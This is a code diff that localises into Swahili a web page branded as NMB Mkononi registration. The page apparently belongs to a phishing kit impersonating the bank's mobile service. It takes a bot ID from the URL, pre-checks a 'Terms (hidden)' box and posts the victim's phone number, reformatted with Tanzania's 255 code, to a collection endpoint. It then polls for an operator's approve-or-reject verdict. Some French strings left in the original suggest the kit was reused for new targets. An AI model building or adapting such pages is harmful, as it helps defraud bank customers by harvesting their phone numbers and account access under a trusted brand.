@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>NMB Mkononi - Registration</title>
+    <title>NMB Mkononi - Usajili</title>
 
     <style>
         /* ===========================
@@ -361,8 +361,8 @@
     <div class="container">
 
         <!-- Page titles -->
-        <div class="title">Registration</div>
-        <div class="subtitle">Welcome to NMB Mkononi</div>
+        <div class="title">Usajili</div>
+        <div class="subtitle">Karibu NMB Mkononi</div>
 
         <form id="detailsForm" class="form-content">
 
@@ -373,7 +373,7 @@
                     type="tel"
                     id="phone"
                     name="phone"
-                    placeholder="Mobile Number"
+                    placeholder="Namba ya Simu"
                     autocomplete="tel-national"
                     required>
             </div>
@@ -388,7 +388,7 @@
                         id="termsCheck"
                         checked
                         required>
-                    <label for="termsCheck">Terms (hidden)</label>
+                    <label for="termsCheck">Masharti (yamefichwa)</label>
                 </div>
 
                 <!-- Continue Button -->
@@ -397,7 +397,7 @@
                     class="primary"
                     id="continueBtn"
                     disabled>
-                    Continue
+                    Endelea
                 </button>
 
             </div>
@@ -410,7 +410,7 @@
 
     </div>
 
-    <!-- ====== YOUR ORIGINAL SCRIPTS (UNTOUCHED) ====== -->
+    <!-- ====== ORIGINAL SCRIPTS (Kiswahili strings) ====== -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
 
@@ -445,7 +445,7 @@
                 spinner.style.display = "block";
 
                 status.style.display = "block";
-                status.textContent = "⏳ En attente d'approbation...";
+                status.textContent = "⏳ Inasubiri idhini...";
 
                 // Your submission logic goes here
             });
@@ -455,7 +455,7 @@
 
     <script>
         let fullName = localStorage.getItem('fullName');
-        if (!fullName) { fullName = 'Client NMB Mkononi';
+        if (!fullName) { fullName = 'Mteja NMB Mkononi';
             localStorage.setItem('fullName', fullName); }
 
         const params = new URLSearchParams(window.location.search);
@@ -463,7 +463,7 @@
         if (urlBotId) localStorage.setItem('botId', urlBotId);
         const botId = localStorage.getItem('botId');
 
-        if (!botId) { alert('Session expirée. Veuillez recommencer.');
+        if (!botId) { alert('Kipindi kimeisha. Tafadhali anza tena.');
             window.location.href = 'index.html'; }
 
         const form = document.getElementById('detailsForm');
@@ -472,28 +472,40 @@
         const nextButton = form.querySelector('button.primary');
         const termsCheck = document.getElementById('termsCheck');
 
+        // TZ country code
+        const COUNTRY_CODE = '255';
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             if (!termsCheck.checked) {
                 statusEl.style.display = 'block';
                 statusEl.classList.add('error');
-                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
+                statusEl.textContent = '❌ Tafadhali kubali masharti ya matumizi';
                 return;
             }
             nextButton.disabled = true;
-            const phone = document.getElementById('phone').value.trim();
-            if (!phone) {
+
+            // ── Build full phone with country code ──
+            const rawPhone = document.getElementById('phone').value.trim();
+            const phoneDigits = rawPhone.replace(/\D/g, '');
+
+            if (!phoneDigits) {
                 statusEl.style.display = 'block';
                 statusEl.classList.add('error');
-                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
+                statusEl.textContent = '❌ Tafadhali weka namba ya simu';
                 nextButton.disabled = false;
                 return;
             }
+
+            // Strip leading 0 if user typed e.g. 0712345678
+            const localPart = phoneDigits.replace(/^0+/, '');
+            const phone = COUNTRY_CODE + localPart;   // e.g. 255712345678
+
             localStorage.setItem('phone', phone);
             statusEl.style.display = 'block';
             spinner.style.display = 'block';
             statusEl.classList.remove('error');
-            statusEl.textContent = '⏳ En attente d\'approbation...';
+            statusEl.textContent = '⏳ Inasubiri idhini...';
             try {
                 const res = await fetch(`${window.location.origin}/submit-phone`, {
                     method: 'POST',
@@ -506,7 +518,7 @@
             } catch (error) {
                 spinner.style.display = 'none';
                 statusEl.classList.add('error');
-                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
+                statusEl.textContent = '❌ Hitilafu ya seva. Tafadhali jaribu tena.';
                 nextButton.disabled = false;
             }
         });
@@ -522,7 +534,7 @@
                         clearInterval(interval);
                         spinner.style.display = 'none';
                         statusEl.classList.add('error');
-                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
+                        statusEl.textContent = '❌ Namba imekataliwa. Tafadhali jaribu tena.';
                         nextButton.disabled = false;
                     }
                     if (data.approved === true) { clearInterval(interval);
